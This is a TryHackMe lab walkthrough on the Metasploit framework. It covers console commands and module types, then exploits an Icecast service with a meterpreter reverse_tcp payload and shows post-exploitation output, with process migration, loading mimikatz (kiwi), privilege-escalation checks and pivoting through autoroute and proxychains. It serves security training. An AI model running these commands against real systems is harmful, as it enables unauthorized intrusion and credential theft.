# Metasploit

**Date:** 23, February, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/rpmetasploit) to go to the TryHackMe room.

## Metasploit
- Metasploit, an open-source pentesting framework, is a powerful tool utilized by security engineers around the world. 
- Maintained by **Rapid 7**, Metasploit is a collection of not only thoroughly tested exploits but also auxiliary and post-exploitation tools.

## Initializing
- Initialize the database: `msfdb init`
- To view the advance options we can trigger for starting the console: `msfconsole -h`
- Start Metasploit using the command: `msfconsole`
- To check whether we have connected to the database: `db_status`

### We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '-'
- **Answer:** -q
- **Steps to Reproduce:** By running `msfconsole -h`, we get to know that `-q` or `--quiet` option is used to start msfconsole withou banner.

---

### Cool! We've connected to the database, which type of database does Metasploit 5 use? 
- **Answer:** postgresql
- **Steps to Reproduce:**
```bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```
---

## Commands
- To view the help menu: `help`

### The help menu has a very short one-character alias, what is it?
- **Answer:** ?

### Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?
- **Answer:** search

### Once we've found the module we want to leverage, what command we use to select it as the active module?
- **Answer:** use

### How about if we want to view information about either a specific module or just the active one we have selected?
- **Answer:** info

### Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?
- **Answer:** connect

### Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?
- **Answer:** banner

### Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally? 
- **Answer:** setg

### Now that we've learned how to change the value of variables, how do we view them? \
- **Answer:** get

### How about changing the value of a variable to null/no value?
- **Answer:** unset

### What command can we use to set our console output to save to a file?
- **Answer:** spool

###  What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.
- **Answer:** save

---
## Modules for every occassion
- Metasploit consists of six core modules that make up the bulk of the tools

### Metasploit Filesystem
- Data
- Documentation
- Lib
- Modules
    1. Auxiliary
    2. Encoders
    3. Exploits
    4. Nops
    5. Payloads
    6. Post
- Plugins
- Scripts
- Tools

### Metasploit Libraries
- Number of MSF libraries allow us to run oru exploits without writing additional code for rudimentary tasks.
1. **REX** - Handles sockets, protocols, text transformations.
1. **MSF::CORE** - provies the basic API
1. **MSF::BASE** - Provides friendly API

### Metasploit modules
1. Exploits - Modules that use payloads
1. Auxiliary - Port scanners, fuzzers, sniffers, etc.
1. Payloads - consists of code that runs remotely
1. Encoders - ensure that payloads make it ot their destination intact
1. Nops - (No OPeration) keep the payload sizes consistent across exploit attempts.
1. Post - post exploitation module

- **Loading Addition module trees**
    1. While starting - `msfconsole -m ~/secret-modules/`
    1. Inside msfconsole - `loadpath /path/to/modules/exploits`

### Easily the most common module utilized, which module holds all of the exploit code we will use?
- **Answer:** exploit

### Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?
- **Answer:** payload

### Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.
- **Answer:** auxiliary

### One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?
- **Answer:** post

### Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?
- **Answer:** encoder

### Last but not least, which module is used with buffer overflow and ROP attacks?
- **Answer:** nop

### Not every module is loaded in by default, what command can we use to load different modules? 
- **Answer:** load
- **Note:**
    - `load` - to load a framework plugin.
    - `loadpath` - to load a module from a path.

---
## Move that shell!
- Metasploit comes with a built-in way to run nmap and feed it's results directly into our database -> `db_nmap -sV MACHINE_IP`.
- Run the following commands:
    - `hosts`
    - `services`
    - `vulns`
-

### What service does nmap identify running on port 135?
- **Answer:** msrpc


### For example, try this out now with the following command `use icecast`. What is the full path for our exploit that now appears on the msfconsole prompt? 
- **Answer:** exploit/windows/http/icecast_header

### What is the name of the column on the far left side of the console that shows up next to 'Name'?
- **Answer:** #
- **Steps to Reproduce:** `search multi/handler`

### Further Instructions
- `use NUMBER_NEXT_TO  exploit/multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `use icecast`
- `set LHOST YOUR_IP_ON_TRYHACKME`
- `set RHOST MACHINE_IP`
- `exploit` or `run -j`
- `jobs` - to view the active jobs.
- `sessions` - to view the active sessions.

## We're in, now what?
- To interact with a session -> `session -i #` (# - session number)
- To push a session to background -> `background` 


### First, let's list the processes using the command ps. What's the name of the spool service?
- **Answer:** spoolsv.exe
- **Steps to Reproduce:** 

```ps
msf6 exploit(windows/http/icecast_header) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]                                   
 4     0     System                                             
 416   4     smss.exe                                           
 500   692   svchost.exe                                        
 544   536   csrss.exe                                          
 588   692   svchost.exe                                        
 592   536   wininit.exe                                        
 604   584   csrss.exe                                          
 652   584   winlogon.exe                                       
 692   592   services.exe                                       
 700   592   lsass.exe                                          
 708   592   lsm.exe                                            
 816   692   svchost.exe                                        
 884   692   svchost.exe                                        
 932   692   svchost.exe                                        
 1060  692   svchost.exe                                        
 1192  692   svchost.exe                                        
 1272  2624  mscorsvw.exe                                       
 1300  500   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1320  1292  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1372  692   spoolsv.exe                                        
 1400  692   svchost.exe                                        
 1456  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1512  816   WmiPrvSE.exe                                       
 1552  692   amazon-ssm-agent.exe                               
 1644  692   LiteAgent.exe                                      
 1684  692   svchost.exe                                        
 1824  692   Ec2Config.exe                                      
 2080  692   svchost.exe                                        
 2284  1320  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2580  692   SearchIndexer.exe                                  
 2624  692   mscorsvw.exe                                       
 2788  816   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2824  2788  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
```

---

### Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!
- **Answer:** migrate
- **Steps to Reproduce:** 
    - Note: The pid of spoolsv.exe is 1372
```ps
meterpreter > migrate 1372
[*] Migrating from 2284 to 1372...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
``` 
- Reasons for migration
```
- Hiding the process to gain persistence and avoid detection.
- Change the process architecture to execute some payloads with the corrent architecture. For example, if there is a 64-bits system and our meterpreter process is 86-bits, some architecture-related problems could happen if we try to execute some exploits against the session gained.
- Migrate to a more stable process.
```
    
---

### Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?
- **Answer:** getuid
- **Steps to Reproduce:** 
```ps
meterpreter > getuid
Server username: Dark-PC\Dark
```

---

### How about finding more information out about the system itself?
- **Answer:** sysinfo
- **Steps to Reproduce:** 
```ps
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

---
 
### This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it? 
- **Answer:** load kiwi
- **Note:** Latest version of mimikatz is called as kiwi. It is a post exploitation tool.

---

### Let's go ahead and figure out the privileges of our current user, what command do we run?
- **Answer:** getprivs
- **Steps to Reproduce:** 
    - Run `help` command.
```ps
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

---

### What command do we run to transfer files to our victim computer?
- **Answer:** upload

---

### How about if we want to run a Metasploit module?
- **Answer:** run

---

### A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?
- **Answer:** ipconfig

---

### Running post modules
- To determine if we are in a VM
```ps
meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine ...
[+] This is a Xen Virtual Machine
```

- To check for various exploit for privilege escalation.
```ps
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.232.195 - Collecting local exploits for x86/windows...
[*] 10.10.232.195 - 37 exploit checks are being tried...
[+] 10.10.232.195 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.232.195 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.232.195 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.232.195 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.232.195 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.232.195 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.232.195 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.232.195 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.232.195 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

- To try forcing RDP to be available. (In this machine, we don't have the privileges yet.)
```ps
meterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210225193747_default_10.10.232.195_host.windows.cle_798590.txt
```

### One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell? 
- **Answer:** shell
- **Steps to Reproduce:** 
```ps
meterpreter > shell
Process 2232 created.
Channel 4 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32> 
```

---

## Makin' Cisco proud

### What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.
- **Answer:** run autoroute -s 172.18.1.0 -n 255.255.255.0
- **Steps to Reproduce:** 
- Subnet mask of `/24` -> 255.255.255.0
```ps
meterpreter > run autoroute -h

[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes

meterpreter > run autoroute -s 172.18.1.0 -n 255.255.255.0

[*] Adding a route to 172.18.1.0/255.255.255.0...
[+] Added route to 172.18.1.0/255.255.255.0 via 10.10.232.195
[*] Use the -p option to list all active routes

meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.0.0          255.255.0.0        Session 2
   172.18.1.0         255.255.255.0      Session 2

```

---

### Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command search server/socks5. What is the full path to the socks5 auxiliary module?
- **Answer:** auxiliary/server/socks5
- **Steps to Reproduce:** 
    - Updates in latest version of msfconsole
```ps
msf6 exploit(windows/http/icecast_header) > search socks5
[-] No results from search
msf6 exploit(windows/http/icecast_header) > search socks

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal
   1  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server
   2  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection

```

---

### Once we've started a socks server we can modify our `/etc/proxychains.conf` file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?
- **Answer:** proxychains
- **Note:** 
    - By adding `proxychains` before our command, we can run them through our socks5 server.
    - Example: `proxychains nmap <IP>`

---

## Reference Links
- [Offensive Security - Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/metasploit-architecture/)
- [Understanding NOPS](https://security.stackexchange.com/questions/30497/nops-in-metasploit)
